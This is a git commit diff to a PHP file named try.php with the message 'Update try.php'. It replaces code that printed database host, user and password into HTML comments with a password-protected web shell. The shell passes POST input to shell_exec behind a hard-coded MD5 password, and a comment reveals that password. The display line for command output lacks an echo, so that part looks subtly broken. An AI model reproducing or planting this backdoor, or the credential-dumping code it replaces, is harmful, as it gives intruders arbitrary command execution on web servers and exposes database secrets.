170a16e7b932a90cf091090115656cd39f38dff0
zimorok <xsqade@gmail.com>
2021-01-09 12:28:59 +0800

    Update try.php

--- try.php
+++ try.php
@@ -1,12 +1,150 @@
-<?php 
-require("Connections/config.php");
+<?php
+//always start session
+//simple shell with password protection
+session_start();
 
+if(isset($_POST['password'])){
+	//hello123
+	 if(md5($_POST['password']) == "f30aa7a662c728b7407c54ae6bfd27d1"){
+	  //create session ['fluid']
+	  $_SESSION['fluid'] = md5(time());
+	 }else{
+    //wrong details
+	  echo "xxx";
+	 }
+}
+//show form if no session detected
+if(!isset($_SESSION['fluid'])){
+	echo "<form method='post'>
+	Password: <input type='password' name='password' /><br>
+	<input type='submit' value='login' />
+	</form>";
+}
+else{
+if (!empty($_POST['cmd'])) {
+    $cmd = shell_exec(trim($_POST['cmd']));
+}
+//logout
+if($_GET['l'] == 'o')
+{
+	if($_SESSION['fluid'])
+	{
+	  session_start();
+	  session_unset();
+	  session_destroy();
+	  session_write_close();
+	  setcookie(session_name(),'',0,'/');
+	}
+}
+else {
+	echo '';
+}
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>hellp</title>
+    <style>
+        * {
+            -webkit-box-sizing: border-box;
+            box-sizing: border-box;
+        }
 
-echo '<!--';
-echo 'Host: '.$dbHost;
-echo 'DB: '.$dbDatabase;
-echo 'user: '.$dbUser;
-echo 'pass: '.$dbPass;
+        body {
+            font-family: sans-serif;
+            color: rgba(0, 0, 0, .75);
+        }
 
-echo '-->';
+        main {
+            margin: auto;
+            max-width: 850px;
+        }
 
+        pre,
+        input,
+        button {
+            border-radius: 5px;
+        }
+
+        pre,
+        input,
+        button {
+            background-color: #efefef;
+        }
+
+        label {
+            display: block;
+        }
+
+        input {
+            width: 100%;
+            background-color: #efefef;
+            border: 2px solid transparent;
+        }
+
+        input:focus {
+            outline: none;
+            background: transparent;
+            border: 2px solid #e6e6e6;
+        }
+
+        button {
+            border: none;
+            cursor: pointer;
+            margin-left: 5px;
+        }
+
+        button:hover {
+            background-color: #e6e6e6;
+        }
+
+        pre,
+        input,
+        button {
+            padding: 10px;
+        }
+
+        .form-group {
+            display: -webkit-box;
+            display: -ms-flexbox;
+            display: flex;
+            padding: 15px 0;
+        }
+    </style>
+
+</head>
+
+<body>
+    <main>
+        <h1>hi</h1>
+        <h2>Execute a command</h2><h3><a href="?l=o">Logout</a></h3>
+
+        <form method="post">
+            <label for="cmd"><strong>Command</strong></label>
+            <div class="form-group">
+                <input type="text" name="cmd" id="cmd" value="<?= htmlspecialchars($_POST['cmd'], ENT_QUOTES, 'UTF-8') ?>"
+                       onfocus="this.setSelectionRange(this.value.length, this.value.length);" autofocus required>
+                <button type="submit">Execute</button>
+            </div>
+        </form>
+
+        <?php if ($_SERVER['REQUEST_METHOD'] === 'POST'): ?>
+            <h2>Output</h2>
+            <?php if (isset($cmd)): ?>
+                <pre><?php htmlspecialchars($cmd, ENT_QUOTES, 'UTF-8') ?></pre>
+            <?php else: ?>
+                <pre><small>No result.</small></pre>
+            <?php endif; ?>
+        <?php endif; ?>
+    </main>
+</body>
+</html>
+ 
+ 
+<?php
+}
+
+?>
